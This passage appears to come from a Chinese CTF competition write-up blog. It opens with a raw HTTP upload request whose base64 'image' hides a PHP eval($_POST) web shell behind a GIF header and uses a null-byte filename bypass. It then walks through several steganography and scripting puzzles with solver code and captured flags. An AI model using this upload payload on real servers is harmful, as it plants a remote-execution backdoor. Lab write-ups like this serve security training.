<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /qbl.php?id=<span class="hljs-number">1</span>.php%<span class="hljs-number">0012312312321321</span>&amp;url=http://baidu.com HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10</span>.<span class="hljs-number">15</span>; rv:<span class="hljs-number">56</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">56</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Referer</span>: https://hnode<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">27281</span>/sc.php?id=<span class="hljs-number">12312312321321</span>&amp;url=http://baidu.com<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">86</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">img</span>=data%<span class="hljs-number">3</span>Aimage%<span class="hljs-number">2</span>Fpng%<span class="hljs-number">3</span>Bbase<span class="hljs-number">64</span>%<span class="hljs-number">2</span>CR<span class="hljs-number">0</span>lGODk<span class="hljs-number">8</span>P<span class="hljs-number">3</span>BocApwaHBpbmZvKCk<span class="hljs-number">7</span>CkBldmFsKCRfUE<span class="hljs-number">9</span>TVFsxXSk<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure>


<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs maxima">┌──(kali㉿kali)-[~/桌面]<br>└─$ zsteg -E <span class="hljs-string">&quot;b1,g,lsb,xy&quot;</span> ezSteganography-flag.png &gt; out.png<br><br><br><br>First <span class="hljs-built_in">part</span> of flag <span class="hljs-built_in">is</span>:flag&#123;2e9ec6480d0515<br>QIM quantization <span class="hljs-built_in">is</span> useful to <span class="hljs-built_in">get</span> another flag.<span class="hljs-keyword">step</span> <span class="hljs-built_in">is</span> <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>


<p>QIM量化</p>
<figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">from</span> <span class="hljs-type">PIL</span> <span class="hljs-keyword">import</span> <span class="hljs-type">Image</span><br><span class="hljs-keyword">from</span> <span class="hljs-type">Crypto</span>.<span class="hljs-type">Util</span> <span class="hljs-keyword">import</span> number<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>def extract(delta,y):<br>	<span class="hljs-keyword">out</span>=[]<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> (delta/<span class="hljs-number">2</span>-y%delta):<br>		<span class="hljs-keyword">if</span> i&gt;<span class="hljs-number">0</span>:<br>			<span class="hljs-keyword">out</span>.append(<span class="hljs-number">1</span>)<br>		<span class="hljs-keyword">else</span>:<br>			<span class="hljs-keyword">out</span>.append(<span class="hljs-number">0</span>)<br>	<span class="hljs-keyword">out</span>=np.<span class="hljs-built_in">array</span>(<span class="hljs-keyword">out</span>)<br>	<span class="hljs-keyword">return</span> <span class="hljs-keyword">out</span><br><br>p=np.<span class="hljs-built_in">array</span>(<span class="hljs-type">Image</span>.open(&#x27;ezSteganography-flag.png&#x27;))<br>R,G,B=p[:,:,<span class="hljs-number">0</span>],p[:,:,<span class="hljs-number">1</span>],p[:,:,<span class="hljs-number">2</span>]<br>G=G.ravel()<br><br>te_out=extract(<span class="hljs-number">20</span>,G)<br>plt.imshow(np.<span class="hljs-built_in">array</span>(te_out).reshape(<span class="hljs-number">1440</span>,<span class="hljs-number">2560</span>))<br>plt.show()<br></code></pre></td></tr></table></figure>


<p>得到另一半flag</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122242-47584.png" srcset="/img/loading.gif" lazyload alt="image-20210815122241546"></p>
<h2 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h2><p>红队和蓝队将开展66轮对抗，你能预测出每轮对抗的结果吗？</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import *       <span class="hljs-comment">#需要用到pwntools模块</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25900</span>)        <span class="hljs-comment">#连接，相当于nc，注：25900是端口，每一次开靶机基本上都不同</span><br>payload = [<span class="hljs-string">&#x27;r&#x27;</span>] * <span class="hljs-number">66</span>    <span class="hljs-comment">#先把答案设置成66个‘r’</span><br>restart = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> restart:<br>    restart = <span class="hljs-number">0</span>        <span class="hljs-comment">#先把restart改为0，避免死循环</span><br>    <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">66</span>):        <span class="hljs-comment">#循环发送答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:&#x27;</span>)        <span class="hljs-comment">#接收函数，一直接收，直到接收到设定的字符串才进行下一语句</span><br>        io.sendline(payload[i])        <span class="hljs-comment">#发送函数，上传第i个答案</span><br>        io.recvuntil(<span class="hljs-string">&#x27;Team&#x27;</span>)<br>        io.recvuntil(<span class="hljs-string">&quot;Team\n&quot;</span>)        <span class="hljs-comment">#因为输入一个答案后会有两个&#x27;Team&#x27;的字符串，所以接收两个‘Team&#x27;后进行下一语句</span><br>        p = io.recv(<span class="hljs-number">10</span>)        <span class="hljs-comment">#接收函数，可控制接收的字符数量，这里接收10个字符</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;The number&#x27;</span> in p:        <br>            <span class="hljs-keyword">continue</span>        <span class="hljs-comment">#接收到&#x27;The number&#x27;则说明这个答案对了，继续进行下一个for语句发送下一个答案</span><br>        <span class="hljs-keyword">else</span>:<br>            io.recvuntil(<span class="hljs-string">&#x27;Play again? (y/n): &#x27;</span>)         <span class="hljs-comment">#如果没有接收到&#x27;The number&#x27;,则第i个答案错误，接收完字符</span><br>            payload[i] = <span class="hljs-string">&#x27;b&#x27;</span>        <span class="hljs-comment">#将第i个答案改正</span><br>            io.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)        <span class="hljs-comment">#发送‘y’重新游戏</span><br>            restart = <span class="hljs-number">1</span>         <span class="hljs-comment">#将restart改为1，将会重新while循环</span><br>            <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs autoit">┌──(kali㉿kali)-[~/桌面]<br>└─$ python3 <span class="hljs-built_in">exp</span>.py                                                                         <br>[*] Checking <span class="hljs-keyword">for</span> new versions of pwntools<br>    <span class="hljs-keyword">To</span> disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache<span class="hljs-number">-3.9</span>/update <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;never&#x27;</span> (old way).<br>    <span class="hljs-literal">Or</span> add the following lines <span class="hljs-keyword">to</span> ~/.pwn.conf <span class="hljs-literal">or</span> ~/.config/pwn.conf (<span class="hljs-literal">or</span> /etc/pwn.conf system-wide):<br>        [update]<br>        interval=never<br>[*] A newer version of pwntools is available on pypi (<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>.dev0 --&gt; <span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0).<br>    Update <span class="hljs-keyword">with</span>: $ pip install -U pwntools==<span class="hljs-number">4.7</span><span class="hljs-number">.0</span>b0<br>[+] Opening connection <span class="hljs-keyword">to</span> node4.buuoj.cn on port <span class="hljs-number">25868</span>: Done<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">14</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">16</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(list[i])<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">0</span><br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">33</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.sendline(<span class="hljs-string">&#x27;y&#x27;</span>)<br>/home/kali/桌面/<span class="hljs-built_in">exp</span>.py:<span class="hljs-number">28</span>: BytesWarning: Text is <span class="hljs-literal">not</span> bytes<span class="hljs-comment">; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br>  p.recvuntil(<span class="hljs-string">&#x27;choose one [r] Red Team,[b] Blue Team:\n&#x27;</span>)<br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">1</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">3</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">4</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">9</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">10</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">12</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">13</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">18</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">20</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">22</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">24</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">26</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">28</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">29</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">31</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">32</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">33</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">35</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">38</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">39</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">40</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">41</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">44</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">45</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">46</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">48</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">50</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">53</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">54</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">55</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">58</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">60</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">61</span><br>The <span class="hljs-built_in">number</span> of successful predictions <span class="hljs-number">66</span><br>[*] Closed connection <span class="hljs-keyword">to</span> node4.buuoj.cn port <span class="hljs-number">25868</span><br>[+] Flag: flag&#123;b<span class="hljs-string">&#x27;c069b2d7-0fca-4819-a656-44e4451deaaf&#x27;</span>&#125;<br>[+] Time: <span class="hljs-number">50.63801121711731</span>s<br></code></pre></td></tr></table></figure>


<h2 id="Just-a-GIF"><a href="#Just-a-GIF" class="headerlink" title="Just a GIF"></a>Just a GIF</h2><p>提取帧数，一共451帧,对比发现11帧一组，一共41组.</p>
<p>把除第1组之后的每一组的第n帧跟第一组的第n帧比较，相同为纯白，不同为纯黑</p>
<p>把同内容的图片作为一个系列，然后系列中的图片与该系列第一张图片比较，新建一张</p>
<p>83x83的空白图，把所有存在像素值不同的位置标记为黑色，即可得到隐藏的11张图片</p>
<p>中的1张，剩下的以此类推即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8 </span><br><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image <br><br><span class="hljs-comment">#分离gif </span><br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Just_a_GIF.gif&#x27;</span>) <br>os.mkdir(<span class="hljs-string">&#x27;./png&#x27;</span>) <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.n_frames): <br>	img.seek(i) <br>	new = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img.size) <br>	new.paste(img) <br>	new.save(<span class="hljs-string">&#x27;png\\&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br><br>    <br>    <br><span class="hljs-comment">#处理分离出来的png </span><br>os.mkdir(<span class="hljs-string">&#x27;./flag&#x27;</span>) <br><br>path1=<span class="hljs-string">r&quot;./flag/&quot;</span> <br>path2=<span class="hljs-string">r&quot;./png/&quot;</span> <br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">11</span>): <br>	img=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br>	<span class="hljs-comment">#隐藏的图片尺寸为83*83 </span><br>	img1=Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">83</span>,<span class="hljs-number">83</span>),(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>)) <br>	<span class="hljs-comment">#图片每帧跟同内容的第一帧进行像素比较，不同处用黑色，叠加起来 </span><br>	<span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>): <br>		im=Image.<span class="hljs-built_in">open</span>(path2+<span class="hljs-built_in">str</span>((h+<span class="hljs-number">1</span>)*<span class="hljs-number">11</span>+i)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br>		width,height=img.size <br>		<span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,width):<br>			<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,height): <br>				tmp = img.getpixel((j,k)) <br>				tmp1 = im.getpixel((j,k)) <br>				<span class="hljs-keyword">if</span> tmp != tmp1: <br>					img1.putpixel((j,k),(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)) <br>	img1.save(path1+<span class="hljs-built_in">str</span>(i+<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;.png&#x27;</span>) <br></code></pre></td></tr></table></figure>
<p>得到11张图片</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122323-509098.png" srcset="/img/loading.gif" lazyload alt="image-20210815122322173"></p>
<p>按照10和11的顺序拼接得到</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122333-324537.png" srcset="/img/loading.gif" lazyload alt="image-20210815122331942"></p>
<p>DataMatrix：<a target="_blank" rel="noopener" href="https://demo.dynamsoft.com/barcode-reader/">https://demo.dynamsoft.com/barcode-reader/</a></p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122350-188687.png" srcset="/img/loading.gif" lazyload alt="image-20210815122347387"></p>
<h2 id="Nuclear-wastewater"><a href="#Nuclear-wastewater" class="headerlink" title="Nuclear wastewater"></a>Nuclear wastewater</h2><p>小明去日本旅游时，发现了一张被核废水污染过的二维码，你能从中发现什么信息吗。</p>
<p>思路：直接处理图片的三个通道，观察rgb数值，并进行chr，可以发现有大量的重复的内容，猜测可以利用词频进行排序</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>pic = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Nuclear wastewater.png&#x27;</span>)<br>a, b = pic.size<br>list1 = []  <span class="hljs-comment">#将三个像素值都存入列表元素</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,b,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, a, <span class="hljs-number">10</span>):<br>        pixel = pic.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel == (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>):<br>             <span class="hljs-keyword">continue</span><br>        r, g, b1 = pixel<br>        list1.extend([r, g, b1])<br><span class="hljs-comment">#print(list1)</span><br><br>dic1 = &#123;&#125;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list1:<br>    dic1[i] = dic1.get(i, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span><br>result = <span class="hljs-built_in">sorted</span>(dic1.items(), key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-number">1</span>], reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> result:<br>    print(<span class="hljs-built_in">chr</span>(s[<span class="hljs-number">0</span>]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">theKEYis:</span><span class="hljs-meta">#R@/&amp;p~!(▒?£ñ$ªVJÞÍFjÀÈ÷¢©¼§UÌ¦õ±·ðäôÉCS</span><br><span class="hljs-number">2</span>ÚHÏ&gt;Á<br></code></pre></td></tr></table></figure>
<p>得到口令#R@/&amp;p~!，解压得到flag.txt</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122426-607150.png" srcset="/img/loading.gif" lazyload alt="image-20210815122425969"></p>
<p>有猫腻，vim查看一下</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122440-299502.png" srcset="/img/loading.gif" lazyload alt="image-20210815122438743"></p>
<p>零宽字节隐写，包含200C、200D、200E，</p>
<p>解题工具：<a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>先在下面设置一下，勾选零宽字符：</p>
<p>U+200C ZERO WIDTH NON-JOINER<br>U+200D ZERO WIDTH JOINER<br>U+200E LEFT-TO-RIGHT MARK</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122452-433384.png" srcset="/img/loading.gif" lazyload alt="image-20210815122451134"></p>
<p>根据提示Citrix CTX1解密</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">OIENKMAJOLEOKMAJOHECLHBCPGFDLNBIPAFFLPBKPIFNLEBBPPFKLFBAPEFBLJBMPHFCLEBBPMFJLEBBPLFOLHBCPCFHLNBIPDFGLHBCPPFKLIBNPHFCLDBGPGFDLBBEPPFKLHBCPPFKLMBJPDFGLCBHPHFCLBBEPIFNLNBIPOFLLMBJPDFGLBBEPEFBLBBEPPFKLGBDPOFLLABFPMFJLABFPCFHLNBIPDFGLMBJPEFBLIBNPHFCLLBOPOFLLBBEPIFNLDBGPAFFKAAFOPEKKDAGOGEDKJAMOAEFKLAOOIENLIBNPEFBLLBOPJFMLFBAPLFOLFBAPNFILEBBPLFOLFBAPAFFLJBMPHFCLJBMPBFELIBNPHFCLIBNPNFILBBEPPFKKPAKOHECKMAJOAEFKKAPOIENKFAAOLEOKHACOPEKKAAFOPEKKAAFOFEAKJAMOHECKLAOODEGKMAJOAEFKPAKONEIKBAEOIENKAAFODEGKAAFOPEKKLAOOOELKJAMOAEFKGADOFEAKEABOLEOKOALOLEOKJAMOAEFKIANOLEOKIANOEEBKFAAOHECKBAEOIENKJAMOKEPKMAJPMFJLCBHPEFBLNBI</span><br></code></pre></td></tr></table></figure>
<p>解码两次得到flag</p>
<p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202108/15/122503-379175.png" srcset="/img/loading.gif" lazyload alt="image-20210815122502554"></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
                    
                      <a class="hover-with-bg" href="/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/Write-up/">Write up</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/08/13/RCTS-CERT-CTF2021/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">RCTS CERT CTF2021</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/06/03/Volatility%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/">
                        <span class="hidden-mobile">Volatility内存取证</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    <!--《添加网站运行时间 -->
<br/>

<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
var now = new Date(); 

function createtime() {
    //此处修改你的建站时间或者网站上线时间
    var grt = new Date('03/01/2020 8:00:00');
    now.setTime(now.getTime() + 250);
    days = (now - grt) / 1000 / 60 / 60 / 24;

    dnum = Math.floor(days);
    hours = (now - grt) / 1000 / 60 / 60 - (24 * dnum);
